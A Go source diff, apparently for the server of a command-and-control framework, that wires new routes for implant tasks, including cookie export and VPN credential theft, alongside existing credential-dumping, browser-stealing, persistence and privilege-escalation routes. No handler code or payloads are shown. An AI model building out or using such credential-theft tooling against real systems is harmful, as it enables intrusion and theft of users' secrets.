@@ -45,6 +45,7 @@ type Server struct {
 	wsUpgrader     websocket.Upgrader
 	rateLimiter    *middleware.RateLimiter
 	apiRateLimiter *middleware.APIRateLimiter
+	loginLockout   *loginLockoutTracker
 	socksEngine    *socksRelayEngine
 	startTime      time.Time
 
@@ -103,6 +104,7 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 		wsClients:             make(map[*websocket.Conn]bool),
 		rateLimiter:           middleware.NewRateLimiter(cfg.RateLimit.Beacon.Limit, time.Duration(cfg.RateLimit.Beacon.Window)*time.Second),
 		apiRateLimiter:        middleware.NewAPIRateLimiter(cfg.RateLimit.API.Capacity, cfg.RateLimit.API.Rate),
+		loginLockout:          newLoginLockoutTracker(),
 		socksEngine:           newSocksRelayEngine(),
 		startTime:             time.Now(),
 		screenMonitorImplants: make(map[string]time.Time),
@@ -437,12 +439,14 @@ func (s *Server) setupRoutes() {
 			agentsWrite.POST("/agents/:id/tasks/:taskId/cancel", s.handleCancelTask)
 			agentsWrite.POST("/agents/:id/task/:taskId/rerun", s.handleRerunTask)
 			agentsWrite.POST("/agents/batch", s.handleBatchCommand)
+			agentsWrite.POST("/api/agents/:id/input", s.handleAgentRemoteInput)
 			agentsWrite.GET("/agents/:id/socks_relay/status", s.handleSocksRelayStatus)
 		}
 		agentsDelete := auth.Group("/")
 		agentsDelete.Use(middleware.RequirePermission(db.PermAgentsDelete))
 		{
 			agentsDelete.DELETE("/agents/:id", s.handleDeleteAgent)
+			agentsDelete.POST("/agents/batch/delete", s.handleBulkDeleteAgents)
 		}
 
 		// ── Agent commands (lock check + viewer check) ──────────────────
@@ -492,6 +496,8 @@ func (s *Server) setupRoutes() {
 			agentCmd.POST("/persistence", s.handlePersistence)
 			agentCmd.POST("/bof", s.handleBOF)
 			agentCmd.POST("/browser_steal", s.handleBrowserSteal)
+			agentCmd.POST("/cookie_export", s.handleCookieExport)
+			agentCmd.POST("/vpn_creds", s.handleVpnCreds)
 			agentCmd.POST("/creds", s.handleCredsDump)
 			agentCmd.POST("/wifi_creds", s.handleWifiCreds)
 			agentCmd.POST("/privesc_check", s.handlePrivescCheck)
